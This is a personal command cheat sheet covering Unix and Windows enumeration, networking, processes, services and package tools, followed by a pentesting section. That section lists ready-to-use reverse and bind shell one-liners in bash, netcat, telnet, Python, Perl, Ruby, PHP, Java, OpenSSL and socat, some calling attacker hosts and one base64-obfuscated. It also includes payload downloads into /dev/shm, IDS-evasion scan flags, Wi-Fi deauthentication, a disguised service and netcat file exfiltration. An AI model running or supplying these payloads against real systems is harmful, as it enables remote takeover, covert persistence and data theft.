# QUICK REFERENCE SECTION

## ENUMERATION
Unix
hostname 		//gets the hostname
whoami	or  id		//current user account
  ps -ef			//get prosseses 
  netstat -anptu | egrep "LIST|udp" 		//TCP and UDP ports, include process information. Only display Listnening state or udp
  chkconfig 		//display what services have been enabled
  w 		//show logged on users
  find /var/log -mmin -20 			//displays  files that have been updated within the last 20 min.
  find /var/log -mmin -20 -exec file {} \; 		//also shows what kind of file
  ls /var/spool/cron 			//check for cron jobs
  cat /etc/rc.local 			//common persistent point for malware
	sudo -l 		//check for sudo access without a password (gold mine)
	cat /etc/passwd			//List users
	cat /etc/passwd | grep -i '/bin/.*sh'			//users who can login
	for user in $(cat /etc/passwd | grep -i '/bin/.*sh' | awk -F: '{print $1}');do echo "$user" ; id "$user";done			//What groups users are in


Windows
  ipconfig /all 
  tasklist /svc		displays processes responsible for what service
  cmd /c "wmic process get name, processid, parentprocessid, executablepath" 			//use this to get the executable path 
  netstat -an | findstr "LIST" 		//find listening ports
  tasklist /v				//shows logged in users
  query user				//shows logged in users
  Get-EventLog -Log system -Newest 50 		//latest 50 system logs
  Get-EventLog -Log security -Newest 50 		//latest 50 security logs
  Get-EventLog -LogName Security -Index <latest index> | Format-Table -Wrap 		//use index number for more info
  net start  		//running services
  reg query hklm\software\microsoft\windows\currentversion\run 		//common persistance location
  schtasks /query 		//view scheduled tasks
  $so = New-PSSessionOption -SkipCACheck -SkipCNCheck					//creates session options to skip authority and CName check. (Use with self signed certs)
  Enter-PSSession -COmputerName 122.66.12.81 -SessionOption $so -UseSSL -Credential $(Get-Credential)				//creats a remote session with above options and 


## NETWORKING
Unix 
  arp -an  			//ARP table
  route -n				//Table for routing through a network without resolving hostnames
  ip route | grep default			//default gateway
  netstat -nr				//route table for all flavors of unix (See below for state meanings)
  route get default		//Route info using FreeBSD and Solaris
  cat /etc/sysconfig/network-scripts/ifcfg*			//CentOS location for network configs
  nmcli device			//NetworkManager CLI command for displaying devices
  nmcli c   				//NetworkManager CLI command for displaying connections
  nmcli c show <device name>			//show command gives detailed configuration info
  cat /etc/network/interfaces			//Debian location for network configs
  cat /etc/hostname.e1000g0			//Solaris 10 location for network configs
  cat /etc/inet/ipnodes				//Solaris 10 location for network configs
  dladm		//Solaris 11 info tool for Data Link layer
  ipadm		//Solaris 11 into tool for Network later
  cat /etc/rc.conf			//FreeBSD network information location
  cat /etc/rsolv.conf			//DNS info
  nmcli c show "Wired connection 1" | grep DNS 		//NetworkManager DNS info
  netstat -anp			//Shows programs that own each connection
  netstat -anu			//shows the user that owns the connection
  sockstat				//FreeBSD command for user/program to network connection correlation.
  ss -anp			//New falvor command for socket statistics

Windows
  ipconfig /all  		//Really?
  ipconfig /displaydns		//dns cache
  type C:\Windows\system32\drivers\etc\hosts		//host file for windows\system32\drivers
  route -4 print			//shows routes 
  arp -a   			//arp table
  netstat -r			//prints route table
  netstat -a -p tcp		//look at connections using TCP
  netstat -a -b -p tcp		//-b shows the processes being used.
  netstat -a -b -p tcp -o 		//shows the PID that has ownership
  tasklist /v /fi "PID eq 527" /fo list		//shows the process name by PID number
  netsh 		//enters netsh
  .. 		// moves you back a context
  netsh interface ipv4 show addresses 		//Shows ip addresses
  netsh interface ipv4 show config ethernet		//more info on specific NIC
  netsh interface ipv4 show route				//displays routes
  netsh interface ipv4> show neighbors Ethernet   		//arp table
  nslookup hostname dns server ip
  ls -d hostname 			//attempts a zone transfer
  nbtstat -c 			//netbios cache
  nbtstat -A 122.66.12.81			//resolves an IP with netbios
  nbtstat –a lakitu		//forward lookup with NetBIOS
  netsh interface ipv4 show wins 		//show active WINS servers
  Resolve-DnsName –LlmnrOnly larry  		//Link-Local Multicast Name Resolution with powershell
  Resolve-DnsName –LlmnrNetbiosOnly lakitu 		//For older systems that do not support Llmnr. NetBIOS is the backup
  getmac			//Get the GUID for all network cards.
  reg query HKLM /f “{5F213C33-DBAE-41B986CB-16115C95C005}” /s 		//searches the registry for the GUID 
  HKLM\SYSTEM\CurrentControlSet\Control\Network – Network adapter settings   			//Hive key for Network adapter settings
  HKLM\SYSTEM\CurrentControlSet\Control\NSI        	//Hive key for Winsock
  HKLM\SOFTWARE\Microsoft\Windows\Windows NT\Current Version\Network List 		//Hive key for Additional adapter information

Tunneling
  //Forward Tunnel (Good for pivoting. After foothold use to redirect traffic to other hosts within the network.)
    ssh -L2222:122.66.12.29:22 root@122.66.12.131		//-L switch is for forward tunnel. listen_port:target_ip:target_port  root is middle-man user and ip is middle-man ip.
    ssh -p 2222 root@127.0.0.1			//Connects to the tunnel. port is your hosts listener and unsername is the username of the target machine.
  //Reverse Tunnel (Good for evading restrictive firewall rules)
    ssh -R8888:122.66.12.40:9999 root@122.66.12.131		//-R switch is for reverse tunneling.  8888 is middle-man port. 9999 is AP port. root and address are middle-man user and IP.
    ~C 			//accesses SSH control channel.
    nc -nvlp 9999			//Set up listener on AP
    nc -nv 122.66.12.131 8888		//Connect from target back to AP through middle-man IP.

## TOOLS
  TCPDump
    tcpdump -w "filename" dst host 192.168.11.12 	##Captures packets too this host.
		tcpdump -nnvi eth0 ip src 1.1.1.1		##looks for traffic from source 1.1.1.1
		tcpdump -nnvi eth0 ip net 10.11.12.0/25 		##captures traffic where the source or destination network is. 10.11.12.0/25
		tcpdump –vnni eth0 host 192.168.11.110 and host 192.168.111.4 		##Capture all traffic between 192.168.11.110 and 192.168.111.4 only
		tcpdump –vnni eth0 host 192.168.11.110 and net 192.168.111.0/24		##Capture all traffic between 192.168.11.110 and the 192.168.111.0/24 network only
		tcpdump -vnni eth0 'ip[6:2] & 0x3fff != 0x0000' 		##captures all fragmented packets.
		tcpdump -vnni eth0 'ip[9] = 50 and ip net 172.30.16.32/27 and ! ip host 172.30.16.62'	##Captures traffic using ESP from host 172.30.16.32/27 except 172.30.16.62

  Wireshark
    eth.src==ab:cd:ef:ab:cd:ef			##filter for source mac address
	  Statistics > Endpoint List > IPv4 		##Hosts involved in communications 
	  tcp.flags.syn == 1 and tcp.flags.ack == 0		##Looks for tcp syn and ack packets to determine what machines are initiating connections.
	  ip.addr == 200.200.12.120		##filter for an IP. Usefull for determining an OS. Look at TTL on packets it sends and compare that to the ephemeral port.
	  udp.length > 58			## How many frames in the capture file have a payload larger than 50 bytes. Remember you have to ad 8 bytes for the header.
    >> https://www.wireshark.org/docs/dfref/		//Display Filter Reference.


## PROCESSES
Unix
  ps -o uid,pid,tty,comm,lstart 		//output certain fields for processes owned by you
  ps -e 			//outputs EVERY processes
  ps ax			//FreeBSD switch for every process even without a controlling terminal
  ps -eo pid,ppid,comm		//shows all processes and their relation with PPID
  ps ax -o pid,ppid,comm 		//FreeBSD shows all processes even without a controlling terminal and their relation with PPID
  ps -eHo pid,ppid,comm		//GNU version of ps that shows relation in a forrest.
  ps -ef			//shows most relevant fields
  ps aux			//FreeBSD shows USUAL fields
	

  Kernal Modules
  ls -al /lib/modules/`uname -r`		//Lists the kernel modules in the /lib/modules/ dir.
  ls -al /boot/kernel					//FreeBSD location for kernel modules
  lsmod			//Shows you what kernel modules are currently loaded
  modinfo			//with no arguments shows kernel modules loaded on Solaris machines. 
  kldstat			//FreeBSD command for loaded kernel modules
  ##Useful
  netstat -antp | grep httpd 		//View network connections associated with a process name (ex: httpd)
  ss -tanp 		//replacement for netstat (gets its info from NETLINK as opposed to /proc file system)

Windows
  tasklist /v 			 //Running processes with verbose information
  tasklist /s 122.66.12.82 /u administrator			//switch for a remote host and designated user.
  wmic process list /?		//use /? for help along the way
  wmic process list brief		//easiest action to use with WMIC
  wmic process get /?			//Lists the properties you can GET
  wmic process get processid, parentprocessid, name, executablepath			//GETS the properites you want
  get-process			//Powershell cmdlt for process information
  get-help get-process		//Powershell cmdlt for info about another cmdlt
  Get-Process -IncludeUserName			//displays user that owns each process
  dir c:\windows\system32\drivers			//Windows location for kernel modules
  driverquery			//shows you drivers
  driverquery /v 		//verbose option
  driverquery /si		//shows you if a driver is signed or not.


## STARTUP AND SERVICES
Unix
  ls /boot 		//boot information

BSD init 
  less /etc/defaults/rc.conf 		//default rc config file
  cat /etc/rc.conf 		//rc config files
  grep enable=\"YES\" /etc/rc.conf /etc/defaults/rc.conf 		//services the init system will start.
  service -e 		//BSD systems shows enabled services that are started
  service -l 		//BSD systems lists all installed services
  less /etc/rc.d/ftpd	 		//BSD systems shows the service script for ftpd
  service ftpd start			//Starts a service 
  service ftpd onestart	  	//use this if the service is not enabled. Starts it one time and not every system boot
  service ftpd onestart 		//Queries the status of the service
  service ftpd stop			//stops the service

SysV init
  cat /etc/inittab 			//inittab file location view
  runlevel 		//display current runlevel
  ls -al /etc/rc.d/rc5.d		//list the files of the current runlevel
  service sshd stop / start 		// stop or start a service
  /etc/rc.d/init.d/sshd stop / start 		//stop or start the service by executing the script.
  chkconfig 		//table for which runlevel every service will be started under
  less /etc/rc.d/init.d/sshd 		//view the script

Service Management Facility
  svcs 		//Solaris10 displays information about services
  svcs -a 		//Includes disabled one
  svcs -l ssh 		//displays a lot of info about a specific service
  svcs -p ssh 		//displays what processes are associated with a service
  svcadm enable svc:/network/http:apache2 		//enables the apache service by Fault Management Resource Indicator (FMRI)
  svcs apache2 		//enables as long as the name is unique
  svcs -a | grep -i apache2 		//view the status of the service
  svcs -xv apache2 		//explaination of the service

Upstart
  rpm -qf /sbin/init 		//uses rpm to query what package provides the /sbin/init
  dpkg -S /sbin/init		//uses dpkg to query what package provides the /sbin/init
  less /etc/init/rc-sysinit.conf 		//defines the default run level for upstart
  initctl list		//list the status of all Upstart jobs
  initctl list | grep running 		//list running
  initctl status ufw 		//view the status of the ufw jobs
  initctl stop ufw
  initctl start ufw

Systemd
  rpm -qf /sbin/init      //query what package provides the init file
  ls -l /sbin/init   		shows symbolic link to systemd
  systemctl get-default 		//Determins the "Runlevel"
  ls -l /etc/systemd/system/default.target 		//Determines the "runlevel"
  cat /etc/systemd/system/default.target 			//View the default target unit file
  ls /etc/systemd/system/multi-user.target.wants/ 		///List the units launched by the multi-user target
  systemd-cgls 		//list the cgroups
  ps -eo comm,cgroup 		//display the cgroups with ps command
  systemd-cgtop 			//View the resource utilization of cgroups
  systemd-analyze critical-chain 		//determine how long uinits take to start
  systemd-analyze blame 		//List running units and how long they took to initialize
  systemctl list-units --type service 		//List service units
  systemctl status crond 		//List the status of a service
  systemctl cat crond.service 		//View the service file
  systemctl stop crond
  systemctl start crond
  systemctl list-dependencies --before sshd.service  		//list dependencies
  systemctl list-dependencies multi-user.target 			//List the requred units of multi-user.target
  systemctl status irqbalance.service -l 		
      >>>>>> Systemd File Extensions
        File Extension       Type 					Description
        .service   		   	service        			Typical system service			
        .target			    	targets  	 			a group of units, replaces runlevels
        .automount        automount 				similar to autofs, mount file system only as needed
        .device			    	device  	   			system devices, automatically created for all block and net
        .mount     filesystem mount point  		same use as fstab entry, can replace fstab entry
        .path			        	path            		monitor path and start unit conditionally
        .scope 		     		scope     				used to manage a set of system processes
  		  .slice            slice					used to manage resource allocation via cgroups
 		    .socket			   	socket					inter-process communication socket
  		  .swap				     swap					manages swap files or swap devices
  		  .timer 			  	timer     			    systemd version of cron



Windows
  net start 		//displays running services
  sc query 		//display service running or not
  sc qc mpssvc 		//query config of a service
  sc stop mpssvc		//stop a service
  sc create myservice binpath= "c:\program files\vmware\vmware tools\vmtoolsd.exe" displayname= "Totally a legit service" type= own 		//create a service
  sc start myservice 		//start a service


# USEFUL COMMANDS
## BASH
	tar -xvzf /path/to/yourfile.tgz
	tar -xvjf /path/to/yourfile.tbz
	bzip2 -d /path/to/yourfile.bz2
	tar jxf file.tar.bz2
	gunzip /path/to/yourfile.gz
	unzip file.zip
	7z -x file.7z
	7z l file.zip				//List files inside zip
  cat /etc/passwd 		//Shows users default shells
  echo $SHELL 		//see what your default shell is
  useradd -p 'openssl passwd -1 <Password>' hacker				//Add new user
	echo $0			//See what shell you are using
  ls_output1=`ls /etc`   		//Command substitution old method. Works with all.
  ls_output2=`ls \`pwd\``		//Command substitution old method. escaping backtics
  ls_output3=$(ls /etc)		//Command substitution new method. Works with Bash and ksh
  ls_output4=$(ls $(pwd))		//Command substitution new method.
  date=`date +%Y%m%d`			//Concatenated variable, format YYYYMMDD
  extension=.log 				//assigns another variable
  logfile=$date$extension 	//new variable, 'YYYYMMDD.log'
  username=`whoami`_user      //sets the variable to 'student_user'
  username=`echo $username | sed s/student/root/`  		//switches to 'root_user'
  c=`expr $a + $b`		//modifying numbers with expr for bash and shell
  let c=($a + $b) 		//modifying numbers with let for bash
  declare -i c="$a + $b"  	//modifying numbers with declare for bash
  ((c=$a + $b)) 		//modifying numbers using the compund copmmand for bash
  @ c= $a + $b 		//modifying numbers using @ for csh
  let c=$a+$b 		//modifying numbers using let for ksh
  i=`expr $i + 1` 	//incrementing numbers for sh
  ((i++)) 			//incrementing numbers for bash
  @ i++ 				//incrementing numbers for csh
  ((++i))				//incrementing numbers for ksh
  lsof -p `echo $$` 		//List open files associated with current bash shell
	lsof -p 3 		//Open files used by the process
	lsof -i 		//Files used by networks processes
	lsof -i 4 		//Files used by network IPv4 processes
	lsof -i 6		 //Files used by network IPv6 processes
	lsof -i 4 -a -p 1234 		//List all open IPV4 network files in use by the process 1234
	lsof +D /lib 		//Processes using files inside the indicated dir
	lsof -i :80 		//Files uses by networks processes
  fuser /etc/passwd 		//Determins processes that have an open descriptor to /etc/passwd
  fstat -p `echo $$`		//List open files associated with current bash shell for FreeBSD
  pfiles `echo $$` 		//List open files associated with current bash shell for Solaris
  read var1 var2 var3 		//take input from user in bash
  set var1 var2 var3 = "$<" 		//take input from user in csh
  exec 0>&- 		//closing STDIN file descriptor in bash and ksh
  exec 1>&- 		//closing STDOUT file descriptor in bash and ksh
  exec 2>&- 		//closing the STDERR file descriptor in bash and ksh
  exec 1>&cmd_out.txt 		//redirects output to a new file descriptor
  exec n>&m		//change a file descriptor (make n the same as m)
  n>&/path/to/file		//syntax for opening a file descriptor
  exec 3<>/dev/tcp/127.0.0.1/8080 		//example of using exec to open a TCP client socket
  ps -ef >&3			//example of sending the output of the cmd to the FD3 (the socket we opened above)
  find /root >&3 2>&3 		//example of sending output and errors to FD3
  exec 3>&-		//closes the above socket.
	sed -i 's/OLD/NEW/g' path/file 				//Replace string inside a file
	wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py			//Download in RAM
	curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py				//Download in RAM
	sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content
	find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null				//Find new files from date


## WINDOWS
	set 		//list environment variables
	nslookup %LOGONSERVER%.%USERDNSDOMAIN% 				//DNS request for DC
	schtasks /query /fo LIST /v 		//Verbose out of scheduled tasks
	schtasks /query /fo LIST 2>nul | findstr TaskName
	schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
	tasklist /V 		 //List processes
	tasklist /SVC		 //links processes to started services
	net start 			//Windows Services started
	wmic service list brief 			//List services
	sc query 				//List of services
	dir /a "C:\Program Files" 			//nstalled software
	dir /a "C:\Program Files (x86)" 			//Installed software
	reg query HKEY_LOCAL_MACHINE\SOFTWARE 			//Installed software
	echo %USERDOMAIN% 		//Get domain name
	echo %USERDNSDOMAIN% 		//Get domain name
	echo %logonserver% 		//Get name of the domain controller
	set logonserver 		//Get name of the domain controller
	set log 			//Get name of the domain controller
	gpresult /V 			//Get current policy applied
	wmic ntdomain list /format:list				//Displays information about the Domain and Domain Controllers
	dsquery user 		//Get all users
	net user /domain 			//List all users of the domain
	net user <ACCOUNT_NAME> /domain 			//Get information about that user
	net accounts /domain 			//Password and lockout policy
	wmic useraccount list /format:list 			//Displays information about all local accounts and any domain accounts that have logged into the device
	wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname 		//Get all users
	wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='user_name'" GET 		//Get info of 1 users
	wmic sysaccount list /format:list 			//Dumps information about any system accounts that are being used as service accounts.
	net group /domain #List of domain groups
	net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the group "Domain Admins" is included here)
	net group "Domain Admins" /domain #List users with domain admin privileges
	net group "domain computers" /domain #List of PCs connected to the domain
	net group "Domain Controllers" /domain #List PC accounts of domains controllers
	wmic group list /format:list # Information about all local groups
	wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname #Get all groups
	wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value #Members of the group
	wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="DOMAIN_NAME"") #Members of the group
	dsquery computer #Get all computers
	net view /domain #Lis of PCs of the domain
	nltest /dclist:<DOMAIN> #List domain controllers
	wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname #All computers
	wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname #All computers
	nltest /domain_trusts 		//Mapping of the trust relationships
	dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"			//Get all objects inside an OU



## POWERSHELL
  $PSVersionTable 		//Checks powershell version
  $cred = Get-Credential 		//stores credentials in variable
  Get-Help -Examples Get-NetIPAddress 		//get examples of how to use the cmdlet
  Get-Alias 		//list of known aliases
  get-netipaddress | get-memeber 		//shows methods and properties for a cmdlet
  $env:MyVar = “myvalue” 		//sets a session environement variable. Persists until current PS process is closed
  Set-Item Env:\MyVar “myvalue”  		//sets a session environement variable. Persists until current PS process is closed
  [System.Environment]::SetEnvironmentVariable(“NewVar”, “MyNewValue”, “Machine”) 		//creates a machine variable
  [System.Environment]::GetEnvironmentVariable(“NewVar”) 			//views machine variable
  $testinput = Read-Host “Enter a value” 		//Read simple inoput with Read-Host
  $mysecurestring = Read-Host “Enter a secret password” -AsSecureString 		//take a secret sting from read-host
  Run-Command > output.txt 2> error.txt 		//saves to file and redirects stderr 
  Run-Command 4>&1 5>&1 6>&1 			//syntax for redirecting output streams
  Get-content .\filename 			//input a file
  Get-Content .\LICENSE | Measure-Object 		//input a file and measure number of lines


# PACKAGE MANEGMENT

RPM
  rpm -qa			//Query all packages installed
  rpm -qa --last		//last installed packes
  rpm -qi firefox			//query information about a specific package
  rpm -qf /bin/ls			//query to see what package a file comes from
  rpm -V perl		//Verifies a package. No return is good. See below for return values
  rpm --querytags		//View custom tags
  rpm -q --queryformat "%{NAME} %{URL}\n" firefox 		//View specific tags

YUM
  cat /etc/yum.conf 		//yum config file
  ls /etc/yum.repos.d/			//yum repositories
  less /etc/yum.repos.d/CentOS-fasttrack.repo   		//View logstash.repo file

Debian
  dpkg -l 		//List installed packages
  dpkg -s zip 		//status of zipped packages
  dpkg --listfiles zip 		//List files of zip packages
  dpkg -S /usr/bin/ssh 		//see what packages a file is from
  dpkg --verify openssh-client 		//verify a package

APT
  cat /etc/apt/sources.list  		//List sources

SOLARIS
  pkginfo		//List information about the installed software package
  pkgchk 		//Check the integrity of an installed software package
  pkgadd		//Install a new software package
  pkgrm		//Remove an installed software package
  pkg publisher		//View publisher

FREEBSD
  pkg_info 		//display packages installed
  pkg_info perl5.18-5.18.2_2 		//Info about a package
  pkg_info -L perl5.18-5.18.2_2		//Display what files are part of a package
  pkg_info -W /usr/local/bin/perl5 		//Identify what package a bin file belongs to
  pkg info		//FreeBSD 10 
  pkg info dialog4ports-0.1.5_2			//FreeBSD 10 info package
  pkg list dialog4ports 			//List the files that are part of a package
  pkg which /usr/local/bin/dialog4ports 		//Determin which package a file is a part of
  pkg check -s dialog4ports 		//Integrity check
  pkg query "%t %n" 		//Display timestamp and name
  cat /etc/pkg/FreeBSD.conf 		


# PENTESTING

External Host discovery
	ping -c 1 192.168.1.1   	 //Sends one echo request to the target host.
	fping -g 192.168.1.0/24 	 //Sends echo requests to a range
	nmap -PE -PM -PP -sn -n 192.168.1.0/24		 //Send echo, timestamp requests and subnet mask requests
	masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 192.168.1.0/24		//Scans selected ports over range of IPs
	masscan -p80,443,8000-8100,8443 192.168.1.0/24 			//Common HTTP port discovery. 
	nmap -sV -Pn -p 21,22,80,443 192.168.1.0				//port discovery command and grabs servie info for selected ports
	nbtscan -r 192.168.0.1/24 		//Search in Domain
	nmap -sn <Network> 			//ARP Requests (Discover IPs)
	netdiscover -r <Network> 			//ARP requests (Discover IPs)
	namp -sV -f -p 22 192.168.1.0 		//bypass IDS/IPS by fragmenting packets
	nmap -sV -p 22 192.168.1.0 --data-length 25 		//bypass IDS/IPS by adding garbage data to packet to avoid signature.

Internal Host Discovery
	sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
	tcpdump -i <IFACE> icmp #Listen to icmp packets
	sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"

WIFI
	ip link show		 #List available interfaces
	iwconfig		 #List available interfaces
	airmon-ng check kill		 #Kill annoying processes
	airmon-ng start wlan0 		#Monitor mode
	airmon-ng stop wlan0mon 		#Managed mode
	airodump-ng wlan0mon		 #Scan (default 2.4Ghz)
	airodump-ng wlan0mon --band a		 #Scan 5Ghz
	airodump-ng wlan0mon --wps 		#Scan WPS
	iwconfig wlan0 mode monitor		 #Put in mode monitor
	iwconfig wlan0mon mode managed 		#Quit mode monitor - managed mode
	iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA"		 #Scan available wifis
	iwlist wlan0 scan 		#Scan available wifis
	aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0			//de-auth using aireplay-ng

Shells
	bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'			
	#Stealthier method	
	#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
	echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null

	Netcat
	nc -e /bin/sh <ATTACKER-IP> <PORT>			//
	nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
	nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
	rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe

	Telnet
	telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
	telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
	rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe

	Whois
	while true; do nc -l <port>; done			//Attacker
	export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done				//Victim

	Python
	#Linux
	export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	#IPv6
	python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 

	Perl
	perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

	Ruby
	ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
	ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

	PHP
	// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
	// Using this method may lead to instances where the connection reaches out to the listener and then closes.
	php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

	// Using 'proc_open' makes no assumptions about what the file descriptor will be.
	// See https://security.stackexchange.com/a/198944 for more information
	<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

	<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>

	Java
	r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
	p.waitFor()

	NCat
	ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl 			//Victim
	ncat -v 10.0.0.22 4444 --ssl				//Attacker

	OpenSSL
	#Attacker
		openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
		openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
		openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
	#Victim
		#Linux
		openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
		#Windows
		openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

	Socat
	Bind Shell
		socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane			//Victim
		socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337			//Attacker
	Reverse Shell
		socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0				//Attacker
		socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane				//Victim

	XTerm
	xterm -display 10.0.0.1:1			//Connect to system at port 6001
	xhost +targetip			//Authorize host on AP
	Xnest :1				//Listen

Full TTY
	#Python
	python -c 'import pty; pty.spawn("/bin/sh")'	
	python3 -c 'import pty; pty.spawn("/bin/bash")'


Exfiltration
	base64 -w0 <file> #Encode file
	base64 -d file #Decode file
	certutil -encode payload.dll payload.b64
	certutil -decode payload.b64 payload.dll
	python -m SimpleHTTPServer 9000			//Run from selected directory then navigate to host from AP
	python3 -m http.server 9000				//Run from selected directory then navigate to host from AP
	pip3 install pyftpdlib && python3 -m pyftpdlib -p 21			//Hosts ftp server
	scp <username>@<Attacker_IP>:<directory>/<filename> 			//If ssh is runnin on AP
	nc -lvnp 4444 > new_file			//On AP
	nc -vn <IP> 4444 < exfil_file			//On Victim
	
